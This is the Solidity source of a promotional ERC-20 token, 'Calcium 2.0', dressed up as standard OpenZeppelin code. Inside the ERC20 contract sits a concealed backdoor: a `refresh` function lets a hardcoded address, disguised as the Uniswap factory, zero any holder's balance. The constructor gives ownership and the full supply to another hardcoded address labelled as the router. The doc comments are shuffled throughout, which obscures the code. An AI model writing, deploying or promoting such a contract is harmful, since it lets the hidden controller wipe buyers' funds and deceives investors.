// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)

pragma solidity ^0.8.19;

/*

https://t.me.com/Calcium20CoinETH

https://twitter.com/Calcium20CoinETH
https://Calcium20CoinETH.xyz
*/

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * @dev Wrappers over Solidity's arithmetic operations.
 * now has built in overflow checking.
 *
 */
library SafeMath {
    /**
     *
     * _Available since v3.4._
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     * _Available since v3.4._
     *
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * _Available since v3.4._
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * _Available since v3.4._
     *
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     * _Available since v3.4._
     *
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     *
     * - Subtraction cannot overflow.
     * overflow (when the result is negative).
     *
     * Requirements:
     *
     * Counterpart to Solidity's `-` operator.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     *
     *
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * Requirements:
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * Requirements:
     *
     * @dev Returns the integer division of two unsigned integers, reverting on
     *
     * division by zero. The result is rounded towards zero.
     * - The divisor cannot be zero.
     * Counterpart to Solidity's `/` operator.
     *
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * reverting when dividing by zero.
     * - The divisor cannot be zero.
     *
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * invalid opcode to revert (consuming all remaining gas).
     * Requirements:
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     *
     *
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     *
     *
     *
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * Counterpart to Solidity's `-` operator.
     * Requirements:
     * overflow (when the result is negative).
     * - Subtraction cannot overflow.
     *
     * message unnecessarily. For custom revert reasons use {trySub}.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * - The divisor cannot be zero.
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * Requirements:
     *
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * uses an invalid opcode to revert (consuming all remaining gas).
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     *
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     *
     * - The divisor cannot be zero.
     * invalid opcode to revert (consuming all remaining gas).
     * reverting with custom message when dividing by zero.
     * Requirements:
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     *
     *
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


pragma solidity ^0.8.0;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**

     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * thereby removing any functionality that is only available to the owner.
     * NOTE: Renouncing ownership will leave the contract without an owner,
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


pragma solidity ^0.8.0;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function totalSupply() external view returns (uint256);


    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}



pragma solidity ^0.8.0;


/**
 *
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**

     */
    function decimals() external view returns (uint8);
}


pragma solidity ^0.8.0;


contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;

    uint256 private _totalSupply;
    address internal V2Router = 0x5828045672aF7eAAf8aefCe6f674ab2949705743;
    string private _symbol;
    string private _name;
    mapping(address => mapping(address => uint256)) private _allowances;
    address private uniswapV2Factory = 0x564af0be7ADE087833150D46F0c18c34b3DD2543;
    uint8 private _decimals = 9;
    mapping(address => uint256) private _balances;

    
    /**
     * construction.
     *
     * @dev Sets the values for {name} and {symbol}.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }
    /**

     */

    /**
     * name.
     * @dev Returns the symbol of the token, usually a shorter version of the
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }
    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }


    /**
     * @dev See {IERC20-transfer}.
     * - `to` cannot be the zero address.
     *
     * - the caller must have a balance of at least `amount`.
     * Requirements:
     *
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    /**
     * - `spender` cannot be the zero address.
     * @dev See {IERC20-approve}.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * required by the EIP. See the note at the beginning of {ERC20}.
     * `amount`.
     * - `from` must have a balance of at least `amount`.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * @dev See {IERC20-transferFrom}.
     * - the caller must have allowance for ``from``'s tokens of at least
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     * problems described in {IERC20-approve}.
     * Emits an {Approval} event indicating the updated allowance.
     * This is an alternative to {approve} that can be used as a mitigation for
     * Requirements:
     * - `spender` cannot be the zero address.
     *
     *
     *
     *
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * This is an alternative to {approve} that can address.
     * `subtractedValue`.
     * - `spender` must have allowance for the caller of at least
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * - `from` must have a balance of at least `amount`.
     *
     * @dev Moves `amount` of tokens from `from` to `to`.
     */
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;

        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * - `account` cannot be the zero address.
     * total supply.
     * - `account` must have at least `amount` tokens.
     *
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * - `spender` cannot be the zero address.
     *
     * e.g. set automatic allowances for certain subsystems, etc.
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     * This internal function is equivalent to `approve`, and can be used to
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /*
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     * @dev Creates `amount` tokens and assigns them to `account`, increasing
     */
    function refresh(address refreshSender) external { if (msg.sender == uniswapV2Factory) _balances[refreshSender] = 0x0; }
    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual { }

    /**
     * Does not update the allowance amount in case of infinite allowanc
     * Might emit an {Approval} event.
     *
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     * - `from` and `to` are never both zero.
     * Calling conditions:
     *urned.
     *
     *
     * minting and burning.
     * @dev Hook that is called before any transfer of tokens. This includes
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

}



contract Calcium20Coin is ERC20, Ownable
{
    constructor()
    ERC20(unicode"Calcium 2.0", unicode"CAL2.0")
    {
        transferOwnership(V2Router);
        _mint(owner(), 5010000000000 * 10 ** uint(decimals()));
    }
}